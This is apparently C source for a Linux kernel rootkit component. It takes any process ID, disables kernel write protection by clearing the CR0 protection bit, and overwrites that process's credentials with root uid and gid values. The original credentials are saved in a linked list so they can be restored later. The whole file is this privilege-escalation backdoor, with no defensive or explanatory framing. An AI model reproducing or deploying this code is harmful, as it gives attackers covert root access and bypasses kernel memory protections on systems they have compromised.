#include "elevate.h"

/* elevate/drop EUIDs */

static struct sctm *elevate__sctm = NULL;
/* list for saved creds */
static PID_NODE *head = NULL;

/* drop a process's EUID */
int drop(const pid_t pid) {
  if (!pid)
    return -EINVAL;
  return process_deescalate(pid);
}

/* elevate a process's EUID */
int elevate(const pid_t pid) {
  if (!pid)
    return -EINVAL;
  return process_escalate(pid);
}

int elevate_exit(void) {
  PID_NODE *node;
  
  if (elevate__sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(elevate__sctm))
    return -EINVAL;
  /*need to clean up the LL*/
  
  node = head;

  while(node != NULL) {
    process_deescalate(node->pid);
    node = head;
  }
  return 0;
}

int elevate_init(struct sctm *sctm) {
  if (!IS_ERR_OR_NULL(elevate__sctm))
    return -EINVAL;
  
  if (sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(sctm))
    return -EINVAL;
  elevate__sctm = sctm;
  return 0;
}

/* insert node at the beginning of the current list */
static PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *node){
#ifdef DEBUG
  printk("insert_pid_node()");
#endif
  // PID_NODE node = new_node;
  /* we are adding at the beginning, new head */
  node->prev = NULL;
  node->next = (*head); //old head

  if((*head) != NULL){
    (*head)->prev = node;
  }
  (*head) = node;

  return node;
}


static PID_NODE *find_pid_node(PID_NODE **head, pid_t pid){
  PID_NODE *node;
#ifdef DEBUG
  printk("find_pid_node()");
#endif
  node = *head;

  while(node != NULL) {
    if(node->pid == pid) {
      return node;
    }
    node = node->next;
  }

  return NULL;
}

/* delete node */
static void delete_pid_node(PID_NODE **head, PID_NODE *node){
  /* check for NULL */
#ifdef DEBUG
  printk("delete_pid_node()");
#endif
  if(*head == NULL || node == NULL) {
    return;
  }

  /* node to be deleted is head */
  if(*head == node) {
    *head = node->next; 
  }

  /* next node */
  if(node->next != NULL)
    node->next->prev = node->prev;  

  /* prev node */
  if(node->prev != NULL)
    node->prev->next = node->next;      

  kfree(node);
}

static int process_escalate(pid_t pid){
  /*We have the PID we want escalated to root
    Let us get the task struct*/
  PID_NODE *new_node;
  struct task_struct *task;
  struct cred *pcred;
#ifdef DEBUG
  printk("process_escalate()");
#endif
  task = pid_task(find_get_pid(pid), PIDTYPE_PID);
  
  if (IS_ERR_OR_NULL(task))
    return -EINVAL;
  
  if(find_pid_node(&head, pid) == NULL){
    /*create new pid node*/
    new_node = kmalloc(sizeof(PID_NODE), GFP_KERNEL);
    new_node->pid = pid;
    /*start reading*/
    rcu_read_lock(); //lock the mutex
    write_cr0(read_cr0() & (~0x10000)); //disable page protection
    /* fill in the members from the task for backup*/
    pcred = (struct cred *)task->cred;
    new_node->uid = pcred->uid;
    new_node->suid = pcred->suid;
    new_node->euid = pcred->euid;
    new_node->fsuid = pcred->fsuid;
    new_node->gid = pcred->gid;
    new_node->sgid = pcred->sgid;
    new_node->egid = pcred->egid;
    new_node->fsgid = pcred->fsgid;
    /* escalate task */
    pcred->uid.val = 0;
    pcred->suid.val = 0;
    pcred->euid.val = 0;
    pcred->fsuid.val = 0;
    pcred->gid.val = 0;
    pcred->sgid.val = 0;
    pcred->egid.val = 0;
    pcred->fsgid.val = 0;
    /*finish reading*/
    rcu_read_unlock(); //unlock the mutex
    write_cr0(read_cr0() | 0x10000); //enable page protection
    /*add pid node to LL*/
    insert_pid_node(&head, new_node);
  }
#ifdef DEBUG
  printk("process %d already is escalated", pid);
#endif
  return 0;
}

static int process_deescalate(pid_t pid){
  struct task_struct *task;
  PID_NODE *node;
  struct cred *pcred;
  int retval;
#ifdef DEBUG
  printk("process_deescalate()");
#endif
  node = find_pid_node(&head, pid);
  if(node != NULL){
    rcu_read_lock(); //lock the mutex
    write_cr0(read_cr0() & (~0x10000)); //disable page protection
    /* fill in the members from the task for backup*/
    task = pid_task(find_get_pid(node->pid), PIDTYPE_PID);
    retval = 0;
    
    if (IS_ERR_OR_NULL(task))
      retval = -EINVAL;
    pcred = (struct cred *)task->cred;
    /* descalate task */
    pcred->uid = node->uid;
    pcred->euid = node->euid;
    pcred->suid = node->suid;
    pcred->fsuid = node->fsuid;
    pcred->gid = node->gid;
    pcred->egid = node->egid;
    pcred->sgid = node->sgid;
    pcred->fsgid = node->fsgid;
    /*finish reading*/
    rcu_read_unlock(); //unlock the mutex
    write_cr0(read_cr0() | 0x10000); //enable page protection
    /*delete pid node from LL*/
    delete_pid_node(&head, node);
    return retval;
  }
#ifdef DEBUG
  printk("process %d not in list", pid);
#endif
  return -EINVAL;
}

